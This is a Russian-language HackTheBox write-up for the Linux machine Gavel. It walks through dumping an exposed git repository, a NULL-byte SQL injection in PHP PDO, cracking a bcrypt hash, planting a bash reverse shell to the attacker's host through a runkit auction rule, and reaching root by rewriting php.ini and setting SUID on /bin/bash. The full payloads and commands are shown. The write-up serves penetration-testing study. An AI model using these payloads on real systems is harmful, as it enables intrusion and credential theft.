[Gavel](https://app.hackthebox.com/machines/Gavel?sort_by=created_at&sort_type=desc) - это Medium Linux машина с платформы HackTheBox. 
По ходу прохождения мы восстановим source code через git-репозиторий, произведем SQL-инъекцию в PHP PDO, а также эксплуатируем модуль Runkit для выхода в RCE и повышения привилегий до root-пользователя.

---
## Reconnaissance

Начнем со сканирования портов.

```bash
IP=10.129.242.203
ports=$(nmap -Pn -n --open --min-rate=1000 $IP -p- | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ','|sed 's/,$//')
sudo nmap -sV -sC $IP -p "$ports" -oN discovery/services
```

![[Pasted image 20260606130757.png]]

Сканер показал два отрытых порта. 
- `22/tcp` - `OpenSSH 8.9p1`
- `80/tcp` - `Apache httpd 2.4.52`

На 80 порте видим редирект на `gavel.htb`. Добавим хост в `/etc/hosts`

```bash
echo "10.129.242.203 gavel.htb" | sudo tee -a /etc/hosts
```

И повторим сканирование веб-сервера.

```bash
sudo nmap -sV -sC gavel.htb -p80 -oN discovery/http
```

![[Pasted image 20260606131016.png]]

Сканер показал доступный git-репозиторий.  При посещении `http://gavel.htb/.git/`, мы видим индексируемую директорию.

![[Pasted image 20260606131138.png]]

Воспользуемся утилитой [git-dumper](https://github.com/arthaud/git-dumper) для выгрузки репозитория.

```bash
pipx install git-dumper
mkdir source
git-dumper http://gavel.htb/.git source
```

![[Pasted image 20260606131642.png]]

Теперь мы имеем доступ к сурсу.

![[Pasted image 20260606131826.png]]

Посмотрим на сайт. По описанию на главной странице это сайт-аукцион.

![[Pasted image 20260606132020.png]]

Зарегистрируем аккаунт и войдем под учетной записью. Нам доступны функции просмотра инвентаря и сам аукцион.

![[Pasted image 20260606132347.png]]

![[Pasted image 20260606132401.png]]

## SQL Injection

Воспользуемся инструментом [opengrep](https://github.com/opengrep/opengrep) (форк semgrep) и [правилами semgrep](https://github.com/semgrep/semgrep-rules) для анализа исходного кода.

```bash
opengrep scan -f /opt/semgrep-rules/php/ source/
```

Сканер показал возможную SQL-инъекцию в файле `inventory.php`. В нем параметр пользовательского запроса попадает в запрос к базе данных.

![[Pasted image 20260606132926.png]]

Уязвимый фрагмент выглядит следующим образом.

```php
$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
$col = "`" . str_replace("`", "", $sortItem) . "`";
try {
    if ($sortItem === 'quantity') {
        $stmt = $pdo->prepare("SELECT item_name, item_image, item_description, quantity FROM inventory WHERE user_id = ? ORDER BY quantity DESC");
        $stmt->execute([$userId]);
    } else {
        $stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
        $stmt->execute([$userId]);
    }
    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
```

Как можно заметить, параметр `$col` экранируется с помощью бэктиков и вставляется в PDO-выражение. Несмотря на то, что это выглядит безопасным, мы можем выйти за контекст PDO во время парсинга выражения с помощью NULL-Byte и внедрить собственный плейсхолдер. Подробно эта техника описана [здесь](https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/).

Изначально выражение выглядит так: 

```sql
SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC
```

Предположим, мы отправим следующий параметр `$col`:

```sql
$col=\?--+-;%00
SELECT `\?--+-;%00` FROM inventory
```

Парсер видит бэктики и понимает, что он находится внутри строкового литерала. Но в момент, когда он доходит до нулевого байта, он сбрасывает контекст и начнет заново анализировать `$col` в "safe-mode". При втором проходе он интерпретирует `?` как плейсхолдер. 

Такое поведение связано с тем, что PDO написан на C, в котором нулевой байт считается концом строки.

Далее мы можем использовать бэктики в параметре `$user_id` чтобы закрыть литерал и писать SQL-выражения.

```sql
$user_id=x`+FROM+(SELECT+version()+AS+`'x`)y;
SELECT `\'x` FROM (SELECT version() AS `\'x`)y;
```

Мы используем `\` перед `?` потому что PDO также экранирует  `'` при подстановке `$user_id`

Отправляем запрос и получаем версию базы данных. Инъекция сработала.

```
user_id=x`+FROM+(SELECT+version()+AS+`'x`)y;&sort=\?;--+-%00
```

![[Pasted image 20260606135912.png]]

Вытаскиваем всех пользователей из базы данных.

```
user_id=x`+FROM+(SELECT+CONCAT(username,0x7e,password)+AS+`'x`+FROM+users)y;&sort=\?;--+-%00
```

![[Pasted image 20260606141406.png]]

В ответе видим логин пользователя и bcrypt-хеш пароля.

```
auctioneer~$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS
```

Запишем хеш в файл и используем hashcat для его крака.

```bash
hashcat -m 3200 -a 0 auctioneer.txt /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20260606144556.png]]

Теперь у нас есть еще одна учетная запись.

```
auctioneer:midnight1
```

## Runkit Exloitation

Входим под полученными кредами и видим доступ к админ-панели, в которой мы можем редактировать правила для лотов.

![[Pasted image 20260606144725.png]]

Посмотрим на то, как работают лоты. В `bid_handler.php` мы видим использование функции `runkit_function_add`, которая позволяет динамически добавлять новые функции во время выполнения кода.

```php
$current_bid = $bid_amount;
$previous_bid = $auction['current_price'];
$bidder = $username;

$rule = $auction['rule'];
$rule_message = $auction['message'];

$allowed = false;

try {
    if (function_exists('ruleCheck')) {
        runkit_function_remove('ruleCheck');
    }
    runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
    error_log("Rule: " . $rule);
    $allowed = ruleCheck($current_bid, $previous_bid, $bidder);
} catch (Throwable $e) {
    error_log("Rule error: " . $e->getMessage());
    $allowed = false;
}
```

Таким образом, если нам удастся записать код в `$rule` и сделать ставку, то сработает `bid_hander`, что спровоцирует выполнение кода.

Записать это правило мы можем через `admin.php` выполнив запрос на создание нового правила.

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $auction_id = intval($_POST['auction_id'] ?? 0);
    $rule = trim($_POST['rule'] ?? '');
    $message = trim($_POST['message'] ?? '');

<SNIP>

    if ($auction_id > 0 && $rule && $message) {
        $stmt = $pdo->prepare("UPDATE auctions SET rule = ?, message = ? WHERE id = ?");
        $stmt->execute([$rule, $message, $auction_id]);
        $_SESSION['success'] = 'Rule and message updated successfully!';
        header('Location: admin.php');
        exit;
    }
}
```

Создадим правило, создающее реверс шелл с атакующей машиной.

```php
system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.123/9001 0>&1'");
```

![[Pasted image 20260606205412.png]]

Запустим слушатель.

```bash
nc -lvnp 9001
```

И сделаем новую ставку. Получаем бэкконект от `www-data`.

![[Pasted image 20260606205438.png]]

## Privilege Escalation

Выполним апгрейд шелла до интерактивного.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# ^z - background
stty raw -echo;fg
```

В системе есть пользователь `auctioneer`, пароль которого мы получили ранее. Зайдем под ним с помощью команды `su`.

`auctioneer` является членом группы `gavel-seller`. Найдем файлы, к которым имеют доступ члены этой группы.

```bash
find / -group gavel-seller 2>/dev/null
```

![[Pasted image 20260606225002.png]]

В выводе видим два интересных файла: 

```
/run/gaveld.sock
/usr/local/bin/gavel-util
```

`gavel-util` позволяет отправить YAML-конфиг, показать статус аукциона и проголосовать.

![[Pasted image 20260606225151.png]]

В списке процессов видим работу демона `gaveld`. 
```bash
ps auxf | grep -E '(gavel|gaveld)'
```

![[Pasted image 20260606225248.png]]

В директории с демоном мы видим `sample.yaml` содержащий пример конфигурации. Судя по параметру `rule` он тоже работает через PHP runkit.

```yaml
---
item:
  name: "Dragon's Feathered Hat"
  description: "A flamboyant hat rumored to make dragons jealous."
  image: "https://example.com/dragon_hat.png"
  price: 10000
  rule_msg: "Your bid must be at least 20% higher than the previous bid and sado isn't allowed to buy this item."
  rule: "return ($current_bid >= $previous_bid * 1.2) && ($bidder != 'sado');"
```
 
А также файл `php.ini`, который отключает опасные функции и ограничивает рабочую директорию.

```ini
engine=On
display_errors=On
display_startup_errors=On
log_errors=Off
error_reporting=E_ALL
open_basedir=/opt/gavel
memory_limit=32M
max_execution_time=3
max_input_time=10
disable_functions=exec,shell_exec,system,passthru,popen,proc_open,proc_close,pcntl_exec,pcntl_fork,dl,ini_set,eval,assert,create_function,preg_replace,unserialize,extract,file_get_contents,fopen,include,require,require_once,include_once,fsockopen,pfsockopen,stream_socket_client
scan_dir=
allow_url_fopen=Off
allow_url_include=Off
```

Создадим свою конфигурацию, которая перезаписывает файл `php.ini` и снимает ограничения.

```yaml
item: "MyItem"
name: "My Item"
description: "Created with gavel util."
image: "https://example.com/dragon_hat.png"
price: 10000
rule_msg: "This is rule msg"
rule: "file_put_contents('/opt/gavel/.config/php/php.ini', 'engine=On' . chr(10) . 'open_basedir=/' . chr(10) . 'memory_limit=32M' . chr(10) . 'max_execution_time=3' . chr(10) . 'max_input_time=10' . chr(10) . 'disable_functions='); return True;"
```

![[Pasted image 20260606221505.png]]

Теперь мы можем использовать `system()` в конфигурации для присвоения SUID-бита `/bin/bash`.

```yaml
rule: "system('chmod u+s /bin/bash'); return True;"
```

Запускаем `bash` с наивысшими привилегиями и получаем root-сессию. Машина пройдена!

![[Pasted image 20260606221953.png]]

---
#web #linux #pentest #writeup 